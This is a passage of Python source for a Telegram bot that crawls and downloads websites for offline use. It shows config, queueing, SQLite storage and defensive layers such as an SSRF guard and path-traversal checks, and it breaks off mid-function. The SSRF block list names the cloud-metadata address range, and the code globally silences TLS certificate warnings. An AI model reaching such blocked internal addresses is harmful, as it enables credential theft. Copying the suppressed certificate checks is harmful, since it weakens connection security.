#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════╗
# ║     Website Downloader Bot  v30.0  — Perfect Downloader     ║
# ║  ✅ All V29 features + Download Engine Overhaul             ║
# ║ ──────────────── v30 Download Fixes ────────────────────── ║
# ║  🔧 HTML rewriting: href/src → local relative paths         ║
# ║     (link, script, img, picture/source, video, a, form,    ║
# ║      inline style, SVG image/use) — offline browsing fixed  ║
# ║  🔧 CSS @import recursive (3 levels) + CSS url() rewrite   ║
# ║  🔧 Crawl depth control --depth N (default 5, max 10)      ║
# ║  🔧 Custom cookie support --cookie "session=abc"            ║
# ║  🔧 Custom header support --header "Key: Value"             ║
# ║  🔧 <picture><source srcset> WebP/AVIF extraction           ║
# ║  🔧 SVG <image href> + <use xlink:href> sprite extraction   ║
# ║  🔧 JS webpack chunks + Next.js /_next/ extraction          ║
# ║  🔧 Large file skip (video/exe/iso >50MB auto-skip)         ║
# ║  🔧 URL normalization (trailing slash dedup fixed)          ║
# ╚══════════════════════════════════════════════════════════════╝

import os, re, json, time, shutil, zipfile, hashlib, hmac, string, struct, tempfile, threading
import logging, asyncio, subprocess, socket, random, difflib, functools, io
from collections import defaultdict, deque
from typing import Dict, List, Set, Tuple, Callable, Optional
import concurrent.futures
from datetime import datetime, date
from ipaddress import ip_address, ip_network, AddressValueError
from urllib.parse import urljoin, urlparse
from functools import lru_cache
import sqlite3                                   # SQLite — built-in, no extra install
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, ContextTypes, filters
)
from telegram.error import BadRequest, RetryAfter, TimedOut, NetworkError
from telegram.request import HTTPXRequest

# ── dotenv (optional but recommended) ────────────
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # pip install python-dotenv မလုပ်ရသေးရင် skip

# ══════════════════════════════════════════════════
# ⚙️  CONFIG  —  .env မှ ယူသည် (fallback: hardcode)
# ══════════════════════════════════════════════════
BOT_TOKEN = os.getenv("BOT_TOKEN", "")  # Set in Railway environment variables
ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip().isdigit()]


# ── Startup validation ──────────────────────────────────────────────────
if not BOT_TOKEN:
    raise SystemExit("❌ BOT_TOKEN not set! Add it to Railway environment variables.")
if not ADMIN_IDS:
    raise SystemExit("❌ ADMIN_IDS not set! Add your Telegram user ID to Railway environment variables.")

# ── DATA_DIR: persistent storage root ──────────────────────────────────
# Railway: mount a volume at /app/data for persistence across deploys
# Without a volume, /app/data is ephemeral (wiped on redeploy) — still works fine
DATA_DIR = os.getenv("DATA_DIR", "/app/data")
os.makedirs(DATA_DIR, exist_ok=True)

# ── SECRET_KEY: persistent across restarts (HMAC resume state integrity) ──
# Bug fix: os.urandom() ကို တိုင်းသုံးရင် restart တိုင်း key ပြောင်းသွားတယ်
# Fix: file ထဲ save ထားပြီး ဖတ်သုံးတယ် — resume HMAC ကို stable ဖြစ်စေသည်
# Railway: SECRET_KEY env var set ထားရင် file မလိုဘဲ directly သုံးသည်
_SECRET_KEY_FILE = os.path.join(DATA_DIR, "secret.key")

def _load_or_create_secret_key() -> str:
    env_key = os.getenv("SECRET_KEY", "")
    if env_key:
        return env_key
    os.makedirs(os.path.dirname(_SECRET_KEY_FILE), exist_ok=True)
    if os.path.exists(_SECRET_KEY_FILE):
        try:
            with open(_SECRET_KEY_FILE, 'r') as f:
                key = f.read().strip()
                if len(key) >= 32:
                    return key
        except Exception as _e:
            logging.debug("Scan error: %s", _e)
    # Generate once and persist
    key = hashlib.sha256(os.urandom(32)).hexdigest()
    try:
        with open(_SECRET_KEY_FILE, 'w') as f:
            f.write(key)
        os.chmod(_SECRET_KEY_FILE, 0o600)  # owner-read only
    except Exception as _e:
        logging.debug("Scan error: %s", _e)
    return key

SECRET_KEY = _load_or_create_secret_key()

DOWNLOAD_DIR    = os.path.join(DATA_DIR, "web_sources")
DB_FILE         = os.path.join(DATA_DIR, "bot_db.json")    # legacy JSON (kept for migration)
SQLITE_FILE     = os.path.join(DATA_DIR, "bot_db.sqlite")  # new SQLite DB
RESUME_DIR      = os.path.join(DATA_DIR, "resume_states")
APP_ANALYZE_DIR = os.path.join(DATA_DIR, "app_analysis")
APP_MAX_MB      = int(os.getenv("APP_MAX_MB", "150"))   # max upload size
JS_RENDER       = os.path.join(os.path.dirname(os.path.abspath(__file__)), "js_render.js")

DAILY_LIMIT           = int(os.getenv("DAILY_LIMIT", "10"))
MAX_WORKERS           = 8
MAX_PAGES             = 300
MAX_ASSETS            = 2000
TIMEOUT               = 25
SPLIT_MB              = 45
MAX_ASSET_MB          = 150
RATE_LIMIT_SEC        = 10    # light commands cooldown
HEAVY_RATE_LIMIT_SEC  = 0     # removed cooldown — queue system handles concurrency
QUEUE_MAX_PER_USER    = 3     # per-user queue slot limit
# ══════════════════════════════════════════════════

logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ── File log with rotation (5MB × 3 files — disk ပြည့်မသွားဖို့) ───
from logging.handlers import RotatingFileHandler
_file_handler = RotatingFileHandler(
    os.path.join(DATA_DIR, "bot.log"),
    maxBytes=5 * 1024 * 1024,   # 5MB per file
    backupCount=3,               # bot.log, bot.log.1, bot.log.2, bot.log.3
    encoding="utf-8"
)
_file_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
logger.addHandler(_file_handler)

for d in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
    os.makedirs(d, exist_ok=True)

download_semaphore: asyncio.Semaphore  # initialized in main()
scan_semaphore:     asyncio.Semaphore  # initialized in main() — max concurrent heavy scans
_active_scans: dict = {}              # {uid: task_name} — track running scans for /stop
_scan_tasks:  dict = {}              # {uid: asyncio.Task} — actual task refs for cancellation

# ── Queue system ──────────────────────────────────
QUEUE_MAX     = 20                    # max queue depth
_dl_queue: asyncio.Queue | None = None  # initialized in main()
_queue_pos: dict = {}                 # {uid: position}
_queue_counter: int = 0              # monotonic counter for accurate position

# ── Auto-delete config ────────────────────────────
FILE_EXPIRY_HOURS = int(os.getenv("FILE_EXPIRY_HOURS", "24"))   # 24h ကြာရင် auto-delete

# ── Global locks / state ──────────────────────────
db_lock: asyncio.Lock                      # initialized in main()
user_last_req    = {}                      # rate limit tracker {uid: timestamp}
user_heavy_req   = {}                      # heavy scan rate limit {uid: timestamp}
user_queue_count = {}                      # per-user queue slot counter {uid: int}
_cancel_flags: dict = {}                   # {uid: asyncio.Event} — /stop signal

HEADERS = {
    'User-Agent': (
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
        'AppleWebKit/537.36 (KHTML, like Gecko) '
        'Chrome/120.0.0.0 Safari/537.36'
    )
}

# ── Puppeteer check ───────────────────────────────
def _check_puppeteer() -> bool:
    script_dir = os.path.dirname(os.path.abspath(__file__))
    return (
        os.path.exists(JS_RENDER) and
        os.path.exists(os.path.join(script_dir, "node_modules", "puppeteer")) and
        shutil.which("node") is not None
    )

PUPPETEER_OK = _check_puppeteer()

# ── HTML parser — lxml 3-5× faster than html.parser ──
try:
    import lxml  # noqa
    _BS_PARSER = 'lxml'
except ImportError:
    _BS_PARSER = 'html.parser'

# ══════════════════════════════════════════════════
# ⚡  PRE-COMPILED REGEX PATTERNS (module-level)
# ══════════════════════════════════════════════════

_RE_URL_IN_HTML = re.compile(
    r'["\']((https?://|/)[^"\'<>\s]+\.(js|css|woff2?|ttf|otf|eot'
    r'|png|jpg|jpeg|gif|svg|webp|avif|ico'
    r'|mp4|webm|mp3|ogg|wav'
    r'|pdf|zip|apk)(\?[^"\'<>\s]*)?)["\']',
    re.IGNORECASE
)
_RE_CSS_URL     = re.compile(r'url\(["\']?(.+?)["\']?\)')
_RE_CSS_IMPORT  = re.compile(r'@import\s+["\'](.+?)["\']')
_RE_JSONLD_IMG  = re.compile(r'"(https?://[^"]+\.(jpg|jpeg|png|webp|gif|svg))"')
_RE_JS_FULL_URL = re.compile(
    r'["\`](https?://[^"\'`<>\s]{8,}\.(?:jpg|jpeg|png|gif|webp|avif|svg|mp4|webm|mp3|pdf))["\`]',
    re.IGNORECASE
)
_RE_JS_REL_URL  = re.compile(
    r'["\`](/[^"\'`<>\s]{3,}\.(?:jpg|jpeg|png|gif|webp|avif|svg|mp4|webm|mp3|pdf))["\`]',
    re.IGNORECASE
)
_RE_SITEMAP_LOC = re.compile(r'<loc>\s*(https?://[^<]+)\s*</loc>')
_RE_ROBOTS_SM   = re.compile(r'(?i)sitemap:\s*(https?://\S+)')


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 1 — SSRF Protection
# ══════════════════════════════════════════════════

_BLOCKED_NETS = [
    ip_network("127.0.0.0/8"),
    ip_network("10.0.0.0/8"),
    ip_network("172.16.0.0/12"),
    ip_network("192.168.0.0/16"),
    ip_network("169.254.0.0/16"),   # AWS/cloud metadata
    ip_network("100.64.0.0/10"),    # Carrier-grade NAT
    ip_network("0.0.0.0/8"),
    ip_network("::1/128"),
    ip_network("fc00::/7"),
    ip_network("fe80::/10"),
]

@lru_cache(maxsize=512)
def _resolve_hostname(hostname: str) -> str:
    """DNS resolution with LRU cache — avoids repeated lookups for same host."""
    return socket.gethostbyname(hostname)

def _is_safe_ip(ip_str: str) -> bool:
    try:
        ip_obj = ip_address(ip_str)
        for net in _BLOCKED_NETS:
            if ip_obj in net:
                return False
        return True
    except (AddressValueError, ValueError):
        return False

def is_safe_url(url: str) -> tuple:
    """
    URL ကို validate လုပ်တယ်
    Returns: (is_safe: bool, reason: str)
    """
    if not url or len(url) > 2048:
        return False, "URL too long or empty"

    try:
        parsed = urlparse(url)
    except Exception:
        return False, "Invalid URL format"

    # Scheme စစ်
    if parsed.scheme not in ('http', 'https'):
        return False, f"Scheme '{parsed.scheme}' not allowed (http/https only)"

    # Hostname စစ်
    hostname = parsed.hostname
    if not hostname:
        return False, "No hostname"

    # Null byte / encoded traversal
    if '\x00' in url or '%00' in url:
        return False, "Null byte detected"

    # URL format — allowed chars only
    if not re.match(r'^https?://[^\s<>"{}|\\^`\[\]]+$', url):
        return False, "Invalid characters in URL"

    # DNS resolve + IP check (cached)
    try:
        ip_str = _resolve_hostname(hostname)
        if not _is_safe_ip(ip_str):
            return False, f"IP {ip_str} is in a blocked network range"
    except socket.gaierror:
        return False, f"Cannot resolve hostname: {hostname}"

    return True, "OK"


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 2 — Path Traversal Protection
# ══════════════════════════════════════════════════

def safe_local_path(domain_dir: str, url: str) -> str:
    """
    URL → local path  (path traversal safe)
    """
    parsed = urlparse(url)
    path = parsed.path.lstrip('/')

    if not path or path.endswith('/'):
        path = path + 'index.html'

    _, ext = os.path.splitext(path)
    if not ext:
        path += '.html'

    if parsed.query:
        sq = re.sub(r'[^\w]', '_', parsed.query)[:20]
        base, ext = os.path.splitext(path)
        path = f"{base}_{sq}{ext}"

    # ── Path traversal check ──────────────────────
    local = os.path.normpath(os.path.join(domain_dir, path))
    real_domain = os.path.realpath(domain_dir)
    real_local  = os.path.realpath(os.path.join(domain_dir, path))

    if not real_local.startswith(real_domain + os.sep) and real_local != real_domain:
        # Traversal attempt → fallback to safe hash-based name
        logger.warning(f"Path traversal attempt blocked: {url}")
        safe_name = hashlib.md5(url.encode()).hexdigest()[:16]
        ext_guess = os.path.splitext(parsed.path)[1][:8] or '.bin'
        local = os.path.join(domain_dir, "assets", safe_name + ext_guess)

    os.makedirs(os.path.dirname(local), exist_ok=True)
    return local


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 3 — Rate Limiting
# ══════════════════════════════════════════════════

def check_rate_limit(user_id: int, heavy: bool = False) -> tuple:
    """
    Returns: (allowed: bool, wait_seconds: int)
    heavy=True → uses HEAVY_RATE_LIMIT_SEC (45s) for resource-intensive scans
    Also auto-cleans stale entries older than 1 hour to prevent memory leak.
    """
    now    = time.time()
    limit  = HEAVY_RATE_LIMIT_SEC if heavy else RATE_LIMIT_SEC
    store  = user_heavy_req if heavy else user_last_req

    # ── TTL cleanup: remove entries older than 1h (prevents unbounded memory growth)
    cutoff = now - 3600
    stale  = [k for k, v in store.items() if v < cutoff]
    for k in stale:
        store.pop(k, None)

    last = store.get(user_id, 0)
    diff = now - last
    if diff < limit:
        wait = int(limit - diff) + 1
        return False, wait
    store[user_id] = now
    return True, 0


# ══════════════════════════════════════════════════
# 🌐  PROXY MANAGER  — Rotation + Health + Failover
# ══════════════════════════════════════════════════

# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 4 — Log Sanitization
# ══════════════════════════════════════════════════

async def safe_edit(msg, text: str, **kwargs):
    """
    Edit a Telegram message safely — Message or CallbackQuery support.
    Silently ignores:
      - 'Message is not modified'   (same content re-edit)
      - 'Message to edit not found' (message deleted)
    """
    try:
        if hasattr(msg, 'edit_message_text'):
            await msg.edit_message_text(text, **kwargs)
        else:
            await msg.edit_text(text, **kwargs)
    except BadRequest as e:
        err = str(e).lower()
        if "message is not modified" in err:
            pass
        elif "message to edit not found" in err:
            pass
        elif "there is no text in the message to edit" in err:
            pass
        else:
            raise


def sanitize_log_url(url: str) -> str:
    """Query string တွေ (passwords/tokens) ကို log မှာ မပြဘဲ REDACTED လုပ်"""
    try:
        parsed = urlparse(url)
        # query ရှိရင် redact
        sanitized = parsed._replace(
            query="[REDACTED]" if parsed.query else "",
            fragment=""
        ).geturl()
        return sanitized
    except Exception:
        return "[INVALID_URL]"

def log_info(msg: str, *args):
    logger.info(msg, *args)

def log_warn(url: str, extra: str = ""):
    safe_url = sanitize_log_url(url)
    logger.warning(f"{safe_url} {extra}")


# ══════════════════════════════════════════════════
# 🔒  SECURITY LAYER 5 — Admin Auth Hardened
# ══════════════════════════════════════════════════

async def verify_admin(update: Update) -> bool:
    """
    Admin verification — multi-layer check
    """
    uid = update.effective_user.id

    # Layer 1: ID check
    if uid not in ADMIN_IDS:
        return False

    # Layer 2: Private chat only (admin commands in group = dangerous)
    if update.effective_chat.type != "private":
        await update.effective_message.reply_text(
            "⚠️ Admin commands ကို private chat မှာသာ သုံးနိုင်ပါတယ်"
        )
        return False

    # Layer 3: Not a forwarded message (anti-spoofing)
    # forward_origin = newer PTB | forward_date = older PTB version
    if update.message:
        is_forwarded = (
            getattr(update.message, 'forward_origin', None) or
            getattr(update.message, 'forward_date', None)
        )
        if is_forwarded:
            return False

    return True

def admin_only(func):
    @functools.wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await verify_admin(update):
            # ── Admin command — user မြင်ရင်မကောင်းဘူး — silent ignore ──
            return
        return await func(update, context)
    return wrapper


# ══════════════════════════════════════════════════
# 🚨  ADMIN ERROR NOTIFY — Unhandled error → Admin DM
# ══════════════════════════════════════════════════

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Global error handler — Admin ဆီ Telegram message ပို့မည်"""
    import traceback

    err = context.error

    # ── Silently ignore non-critical Telegram API errors ──────────
    if isinstance(err, BadRequest):
        err_msg = str(err).lower()
        if any(s in err_msg for s in (
            "message is not modified",       # same content re-edit
            "message to edit not found",     # message deleted
            "there is no text in the message to edit",
            "query is too old",              # stale callback query
            "message can't be deleted",     # already deleted
        )):
            logger.debug("Ignored non-critical BadRequest: %s", err)
            return

    if isinstance(err, (TimedOut, NetworkError)):
        logger.warning("Network error (ignored in handler): %s", err)
        return

    # ── Real errors → log + notify admin ──────────────────────────
    tb = "".join(traceback.format_exception(
        type(err), err, err.__traceback__
    ))
    short_tb = tb[-1500:] if len(tb) > 1500 else tb

    user_info = ""
    if update and hasattr(update, "effective_user") and update.effective_user:
        u = update.effective_user
        user_info = f"\n👤 User: `{u.id}` ({u.first_name})"

    msg = (
        "🚨 *Bot Error Alert*\n"
        f"━━━━━━━━━━━━━━━━━━━━{user_info}\n\n"
        f"```\n{short_tb}\n```"
    )

    for admin_id in ADMIN_IDS:
        try:
            await context.bot.send_message(
                chat_id=admin_id,
                text=msg,
                parse_mode='Markdown'
            )
        except Exception:
            logger.warning("Admin error notify failed for %d", admin_id)

    logger.error("Unhandled exception: %s", err, exc_info=err)


# ══════════════════════════════════════════════════
# 🗑️  AUTO-DELETE — Expired download files cleaner
# ══════════════════════════════════════════════════

async def auto_delete_loop():
    """Background task — ၂၄ နာရီ (FILE_EXPIRY_HOURS) ကြာတဲ့ ZIP files auto-delete"""
    while True:
        try:
            now     = time.time()
            deleted = 0
            freed   = 0.0
            for folder in [DOWNLOAD_DIR, RESUME_DIR, APP_ANALYZE_DIR]:
                for root, dirs, files in os.walk(folder):
                    for fname in files:
                        fpath = os.path.join(root, fname)
                        try:
                            age_hours = (now - os.path.getmtime(fpath)) / 3600
                            if age_hours >= FILE_EXPIRY_HOURS:
                                size = os.path.getsize(fpath) / 1024 / 1024
                                os.remove(fpath)
                                deleted += 1
                                freed   += size
                        except Exception:
                            pass
            if deleted:
                logger.info(
                    "Auto-delete: %d files | %.1f MB freed (>%dh old)",
                    deleted, freed, FILE_EXPIRY_HOURS
                )
        except Exception as e:
            logger.warning("Auto-delete loop error: %s", e)
        # ၁ နာရီတစ်ကြိမ် check
        await asyncio.sleep(3600)


# ══════════════════════════════════════════════════
# 📋  QUEUE SYSTEM — Download request queue
# ══════════════════════════════════════════════════

async def queue_worker():
    """Background worker — queue ထဲက download request တွေ တစ်ခုစီ run"""
    global _dl_queue
    while True:
        try:
            task = await _dl_queue.get()
            update, context, url, full_site, use_js, resume_mode, uid, *_extra = task
            _cookies_q       = _extra[0] if len(_extra) > 0 else ""
            _extra_headers_q = _extra[1] if len(_extra) > 1 else ""
            _max_depth_q     = _extra[2] if len(_extra) > 2 else 5
            _queue_pos.pop(uid, None)
            try:
                await _run_download(update, context, url, full_site, use_js, resume_mode,
                                    _cookies_q, _extra_headers_q, _max_depth_q)
            except Exception as e:
                logger.error("Queue worker download error: %s", e)
            finally:
                # Decrement per-user slot counter
                user_queue_count[uid] = max(0, user_queue_count.get(uid, 1) - 1)
                _dl_queue.task_done()
        except Exception as e:
            logger.error("Queue worker error: %s", e)
            await asyncio.sleep(1)


async def enqueue_download(
    update: Update, context: ContextTypes.DEFAULT_TYPE,
    url: str, full_site: bool, use_js: bool, resume_mode: bool = False,
    cookies: str = "", extra_headers: str = "", max_depth: int = 5,
):
    """Download request ကို queue ထဲ ထည့်သည်
    Improved: per-user queue limit (QUEUE_MAX_PER_USER) to prevent queue monopoly.
    """
    global _dl_queue, _queue_counter
    uid = update.effective_user.id

    # Global queue full check
    if _dl_queue.qsize() >= QUEUE_MAX:
        await update.effective_message.reply_text(
            f"⚠️ Queue ပြည့်နေပါတယ် (`{QUEUE_MAX}` max)\n"
            "ခဏနေပြီးမှ ထပ်ကြိုးစားပါ",
            parse_mode='Markdown'
        )
        return

    # Per-user queue limit check
    user_slots = user_queue_count.get(uid, 0)
    if user_slots >= QUEUE_MAX_PER_USER:
        await update.effective_message.reply_text(
            f"⚠️ သင့် queue slot `{QUEUE_MAX_PER_USER}` ပြည့်နေပါပြီ\n"
            "ပြီးဆုံးသည့်အခါ ထပ်ထည့်နိုင်ပါမည်",
            parse_mode='Markdown'
        )
        return

    _queue_counter += 1
    pos = _dl_queue.qsize() + 1
    user_queue_count[uid] = user_slots + 1

    await _dl_queue.put((update, context, url, full_site, use_js, resume_mode, uid, cookies, extra_headers, max_depth))
    _queue_pos[uid] = pos

    if pos > 1:
        await update.effective_message.reply_text(
            f"📋 *Queue ထဲ ထည့်ပြီးပါပြီ*\n"
            f"📍 Position: `{pos}` | သင့် slots: `{user_slots+1}/{QUEUE_MAX_PER_USER}`\n"
            f"⏳ Download ရောက်လာသည့်အခါ အလိုအလျောက် စမည်",
            parse_mode='Markdown'
        )


# ══════════════════════════════════════════════════
# 📦  DATABASE  (with async lock for race condition)
# ══════════════════════════════════════════════════

# ══════════════════════════════════════════════════════════════
# 🗄️  SQLite DATABASE LAYER  (replaces JSON flat-file)
#     • Built-in sqlite3 — no extra install required
#     • WAL mode: concurrent reads + writes without blocking
#     • Async via run_in_executor — never blocks event loop
#     • Auto-migrates from legacy bot_db.json on first run
#     • db_lock still used for write serialization safety
# ══════════════════════════════════════════════════════════════

def _sqlite_init():
    """Create tables if not exist. Called once at startup."""
    con = sqlite3.connect(SQLITE_FILE, timeout=30)
    con.execute("PRAGMA journal_mode=WAL")   # WAL = concurrent read+write
    con.execute("PRAGMA synchronous=NORMAL") # faster writes, still safe
    con.execute("PRAGMA cache_size=-8000")   # 8MB cache
    con.execute("""
        CREATE TABLE IF NOT EXISTS users (
            uid          TEXT PRIMARY KEY,
            name         TEXT DEFAULT '',
            banned       INTEGER DEFAULT 0,
            daily_limit  INTEGER,
            count_today  INTEGER DEFAULT 0,
            last_date    TEXT DEFAULT '',
            total_downloads INTEGER DEFAULT 0,
            total_scans  INTEGER DEFAULT 0,
            scans_today  INTEGER DEFAULT 0,
            downloads    TEXT DEFAULT '[]',
            scan_history TEXT DEFAULT '[]'
        )
    """)
    con.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key   TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    # Default settings
    defaults = [
        ("global_daily_limit", str(DAILY_LIMIT)),
        ("max_pages",          str(MAX_PAGES)),
        ("max_assets",         str(MAX_ASSETS)),
        ("bot_enabled",        "1"),
    ]
    for k, v in defaults:
        con.execute("INSERT OR IGNORE INTO settings(key,value) VALUES(?,?)", (k, v))
    con.commit()
    con.close()
    logging.info("SQLite DB initialized: %s", SQLITE_FILE)


def _migrate_json_to_sqlite():
    """One-time migration: bot_db.json → SQLite (runs only if JSON exists and has data)."""
    if not os.path.exists(DB_FILE):
        return
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            old = json.load(f)
    except Exception as e:
        logging.warning("JSON migration read error: %s", e)
        return

    if not old.get("users"):
        return  # nothing to migrate

    con = sqlite3.connect(SQLITE_FILE, timeout=30)
    migrated = 0
    for uid, u in old["users"].items():
        try:
            con.execute("""
                INSERT OR REPLACE INTO users
                (uid, name, banned, daily_limit, count_today, last_date,
                 total_downloads, total_scans, scans_today, downloads, scan_history)
                VALUES (?,?,?,?,?,?,?,?,?,?,?)
            """, (
                uid,
                u.get("name", ""),
                1 if u.get("banned") else 0,
                u.get("daily_limit"),
                u.get("count_today", 0),
                u.get("last_date", ""),
                u.get("total_downloads", 0),
                u.get("total_scans", 0),
                u.get("scans_today", 0),
                json.dumps(u.get("downloads", [])[-100:]),
                json.dumps(u.get("scan_history", [])[-20:]),
            ))
            migrated += 1
        except Exception as e:
            logging.warning("Migration error for uid %s: %s", uid, e)

    # Migrate settings
    if "settings" in old:
        for k, v in old["settings"].items():
            con.execute("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)",
                        (k, str(int(v) if isinstance(v, bool) else v)))

    con.commit()
    con.close()
    logging.info("Migrated %d users from JSON to SQLite", migrated)
    # Rename old file so migration doesn't repeat
    os.rename(DB_FILE, DB_FILE + ".migrated")


def _get_con() -> sqlite3.Connection:
    """Get a short-lived SQLite connection (WAL mode, thread-safe)."""
    con = sqlite3.connect(SQLITE_FILE, timeout=30, check_same_thread=False)
    con.execute("PRAGMA journal_mode=WAL")
    con.row_factory = sqlite3.Row
    return con


def _load_db_sync() -> dict:
    """Compatibility shim — loads full DB as dict (for code that still uses db dict pattern)."""
    con = _get_con()
    try:
        users = {}
        for row in con.execute("SELECT * FROM users"):
            uid = row["uid"]
            users[uid] = {
                "name":            row["name"],
                "banned":          bool(row["banned"]),
                "daily_limit":     row["daily_limit"],
                "count_today":     row["count_today"],
                "last_date":       row["last_date"],
                "total_downloads": row["total_downloads"],
                "total_scans":     row["total_scans"],
                "scans_today":     row["scans_today"],
                "downloads":       json.loads(row["downloads"] or "[]"),
                "scan_history":    json.loads(row["scan_history"] or "[]"),
            }
        settings = {}
        for row in con.execute("SELECT key, value FROM settings"):
            v = row["value"]
            try:
                settings[row["key"]] = int(v) if v.lstrip("-").isdigit() else (True if v == "1" else (False if v == "0" else v))
            except Exception:
                settings[row["key"]] = v
        return {"users": users, "settings": settings}
    finally:
        con.close()


def _save_db_sync(db: dict):
    """Compatibility shim — writes full db dict back to SQLite."""
    con = _get_con()
    try:
        settings = db.get("settings", {})
        for k, v in settings.items():
            con.execute("INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)",
                        (k, str(int(v) if isinstance(v, bool) else v)))

        for uid, u in db.get("users", {}).items():
            con.execute("""
                INSERT OR REPLACE INTO users
                (uid, name, banned, daily_limit, count_today, last_date,
                 total_downloads, total_scans, scans_today, downloads, scan_history)
                VALUES (?,?,?,?,?,?,?,?,?,?,?)
            """, (
                uid,
                u.get("name", ""),
                1 if u.get("banned") else 0,
                u.get("daily_limit"),
                u.get("count_today", 0),
                u.get("last_date", ""),
                u.get("total_downloads", 0),
                u.get("total_scans", 0),
                u.get("scans_today", 0),
                json.dumps(u.get("downloads", [])[-100:]),
                json.dumps(u.get("scan_history", [])[-20:]),
            ))
        con.commit()
    finally:
        con.close()


async def db_read() -> dict:
    """Async DB read — runs in executor so event loop is never blocked."""
    loop = asyncio.get_running_loop()
    return await loop.run_in_executor(None, _load_db_sync)


async def db_write(db: dict):
    """Async DB write — runs in executor."""
    loop = asyncio.get_running_loop()
    async with db_lock:
        await loop.run_in_executor(None, _save_db_sync, db)


async def db_update(func):
    """Atomic read-modify-write. Usage: await db_update(lambda db: ...)"""
    loop = asyncio.get_running_loop()
    async with db_lock:
        db = await loop.run_in_executor(None, _load_db_sync)
        func(db)
        await loop.run_in_executor(None, _save_db_sync, db)
        return db

def get_user(db: dict, user_id: int, name: str = "") -> dict:
    uid = str(user_id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "name": name, "banned": False,
            "daily_limit": None, "count_today": 0,
            "last_date": "", "total_downloads": 0,
            "downloads": [],
            "total_scans": 0, "scans_today": 0,
            "scan_history": [],   # last 20 scans [{type,target,ts}]
        }
    if name:
        db["users"][uid]["name"] = name
    return db["users"][uid]


def track_scan(db: dict, uid: int, scan_type: str, target: str):
    """Record a scan in user's history."""
    u = db["users"].get(str(uid))
    if not u: return
    u.setdefault("total_scans", 0)
    u.setdefault("scans_today", 0)
    u.setdefault("scan_history", [])
    u["total_scans"]  += 1
    u["scans_today"]  += 1
    entry = {"type": scan_type, "target": target[:80],
             "ts": datetime.now().strftime("%m-%d %H:%M")}
    u["scan_history"].insert(0, entry)
    if len(u["scan_history"]) > 20:
        u["scan_history"] = u["scan_history"][:20]


def reset_daily(user: dict):
    today = str(date.today())
    if user["last_date"] != today:
        user["count_today"] = 0
        user["last_date"] = today

def get_limit(db: dict, user: dict) -> int:
    return user["daily_limit"] if user["daily_limit"] is not None \
           else db["settings"]["global_daily_limit"]

def can_download(db: dict, user: dict) -> bool:
    reset_daily(user)
    lim = get_limit(db, user)
    return lim == 0 or user["count_today"] < lim

def log_download(user: dict, url: str, size_mb: float, status: str):
    user["downloads"].append({
        "url": sanitize_log_url(url),       # ← sanitized before storing
        "time": datetime.now().strftime("%Y-%m-%d %H:%M"),
        "size_mb": round(size_mb, 2),
        "status": status
    })
    if len(user["downloads"]) > 100:
        user["downloads"] = user["downloads"][-100:]
    user["count_today"] += 1
    user["total_downloads"] += 1


# ══════════════════════════════════════════════════
# 💾  RESUME STATE  (with HMAC integrity)
# ══════════════════════════════════════════════════

def _state_sig(state: dict) -> str:
    data = json.dumps({k: v for k, v in state.items() if k != "_sig"}, sort_keys=True)
    return hmac.HMAC(SECRET_KEY.encode(), data.encode(), hashlib.sha256).hexdigest()

def _resume_path(url: str) -> str:
    return os.path.join(RESUME_DIR, hashlib.md5(url.encode()).hexdigest()[:12] + ".json")

def load_resume(url: str) -> dict:
    path = _resume_path(url)
    empty = {"visited": [], "downloaded": [], "assets": [], "stats": {}}
    if not os.path.exists(path):
        return empty
    try:
        with open(path) as f:
            state = json.load(f)
        sig = state.pop("_sig", "")
        if not hmac.compare_digest(_state_sig(state), sig):
            logger.warning("Resume state integrity check FAILED — ignoring")
            os.remove(path)
            return empty
        return state
    except Exception:
        return empty

def save_resume(url: str, state: dict):
    to_save = dict(state)
    to_save["_sig"] = _state_sig(state)
    tmp = _resume_path(url) + ".tmp"
    with open(tmp, 'w') as f:
        json.dump(to_save, f)
    os.replace(tmp, _resume_path(url))

def clear_resume(url: str):
    p = _resume_path(url)
    if os.path.exists(p):
        os.remove(p)


# ══════════════════════════════════════════════════
# 📊  PROGRESS BAR (Upgraded for Telegram)
# ══════════════════════════════════════════════════

def pbar(done: int, total: int, width: int = 18) -> str:
    """Telegram တွင် ပိုမိုသပ်ရပ်ချောမွေ့စွာ ပြသပေးမည့် Progress Bar"""
    if total <= 0:
        return "│" + " " * width + "│   0%"
    
    pct = min(max(done / total, 0.0), 1.0)
    fill_exact = pct * width
    full_blocks = int(fill_exact)
    remainder = fill_exact - full_blocks

    partials = [" ", "▏", "▎", "▍", "▌", "▋", "▊", "▉"]
    
    bar = "█" * full_blocks
    if full_blocks < width:
        bar += partials[int(remainder * len(partials))]
        bar += " " * (width - full_blocks - 1)

    pct_str = f"{int(pct * 100):>3}%"
    return f"│{bar}│ {pct_str}"

# ══════════════════════════════════════════════════
# 🌐  JS RENDERER  (Puppeteer via subprocess)
# ══════════════════════════════════════════════════

def fetch_with_puppeteer(url: str) -> str | None:
    """
    SECURITY: URL ကို sanitize + validate ပြီးမှသာ subprocess pass
